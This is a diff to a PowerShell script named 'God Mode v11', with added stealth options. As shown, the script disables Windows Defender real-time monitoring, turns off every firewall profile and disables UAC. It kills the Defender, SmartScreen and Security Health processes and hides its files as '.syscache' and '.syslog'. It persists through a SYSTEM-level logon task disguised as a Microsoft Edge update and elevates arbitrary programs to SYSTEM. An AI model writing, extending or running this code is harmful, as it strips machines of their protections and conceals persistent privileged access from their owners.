@@ -2,28 +2,33 @@
 
 <#
 .SYNOPSIS
-    God Mode - Stealth + Dangerous Mode
+    God Mode v11 - Dangerous + Stealth Mode Combined
 #>
 
 param(
     [switch]$ToggleOn,
     [switch]$ToggleOff,
     [switch]$Status,
-    [switch]$Launch
+    [switch]$Launch,
+    [switch]$Stealth
 )
 
-$FlagFile = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syscache"
-$LogFile  = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syslog"
-$TaskName = "MicrosoftEdgeUpdateTask_" + (Get-Random -Minimum 10000 -Maximum 99999)
+$FlagFile   = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syscache"
+$LogFile    = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syslog"
+$TaskBase   = "MicrosoftEdgeUpdateTask_"
 
 function Write-Log {
     param([string]$Message, [string]$Level = "INFO")
     $Time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
     "[$Time] [$Level] $Message" | Out-File $LogFile -Append -Encoding UTF8
+    if (-not $Stealth -and $Level -ne "STEALTH") {
+        Write-Host "[$Time] [$Level] $Message"
+    }
 }
 
-function Apply-StealthDangerous {
-    # Disable security features silently
+function Apply-DangerousSettings {
+    Write-Log "Applying dangerous settings..." "WARN"
+
     try {
         Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
         Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction SilentlyContinue
@@ -31,12 +36,14 @@ function Apply-StealthDangerous {
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 0 -Force
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -Value 0 -Force
 
-        # Try to stop Defender processes
-        Get-Process -Name MsMpEng, smartscreen -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+        # Kill Defender processes
+        Get-Process -Name MsMpEng, smartscreen, SecurityHealthService -ErrorAction SilentlyContinue |
+            Stop-Process -Force -ErrorAction SilentlyContinue
     } catch {}
 }
 
-function Revert-StealthSettings {
+function Revert-DangerousSettings {
+    Write-Log "Reverting settings..." "WARN"
     try {
         Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
         Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True -ErrorAction SilentlyContinue
@@ -50,31 +57,34 @@ function Set-Toggle {
     param([bool]$Enabled)
     if ($Enabled) {
         "1" | Out-File $FlagFile -Force
-        Apply-StealthDangerous
+        Apply-DangerousSettings
         Start-StealthMonitor
+        Write-Log "God Mode ENABLED (Dangerous + Stealth)" "WARN"
     } else {
         Remove-Item $FlagFile -Force -ErrorAction SilentlyContinue
-        Revert-StealthSettings
-        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
+        Revert-DangerousSettings
+        Unregister-ScheduledTask -TaskName $TaskBase* -Confirm:$false -ErrorAction SilentlyContinue
+        Write-Log "God Mode DISABLED" "WARN"
     }
 }
 
 function Get-Status {
     if (Test-Path $FlagFile) {
-        Write-Host "Status: ACTIVE (Stealth Dangerous Mode)" -ForegroundColor Red
+        Write-Host "God Mode: ACTIVE (Dangerous + Stealth)" -ForegroundColor Red
     } else {
-        Write-Host "Status: INACTIVE" -ForegroundColor Yellow
+        Write-Host "God Mode: INACTIVE" -ForegroundColor Yellow
     }
 }
 
 function Start-StealthMonitor {
-    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
+    $randomTask = $TaskBase + (Get-Random -Minimum 10000 -Maximum 99999)
+    Unregister-ScheduledTask -TaskName $randomTask -Confirm:$false -ErrorAction SilentlyContinue
 
     $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Launch"
     $Trigger = New-ScheduledTaskTrigger -AtLogon
     $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 
-    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Force | Out-Null
+    Register-ScheduledTask -TaskName $randomTask -Action $Action -Trigger $Trigger -Principal $Principal -Force | Out-Null
 }
 
 function Elevate-Process {
@@ -84,6 +94,7 @@ function Elevate-Process {
         $Action = New-ScheduledTaskAction -Execute $Path
         $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
         $tempTask = "UpdateTask_" + (Get-Random -Minimum 1000 -Maximum 99999)
+
         Register-ScheduledTask -TaskName $tempTask -Action $Action -Principal $Principal -Force | Out-Null
         Start-ScheduledTask -TaskName $tempTask
         Start-Sleep -Milliseconds 300
@@ -109,7 +120,7 @@ function Start-GodMode {
     }
 }
 
-# === CLI (Minimal output) ===
+# === CLI ===
 if ($ToggleOn)  { Set-Toggle $true; exit }
 if ($ToggleOff) { Set-Toggle $false; exit }
 if ($Status)    { Get-Status; exit }
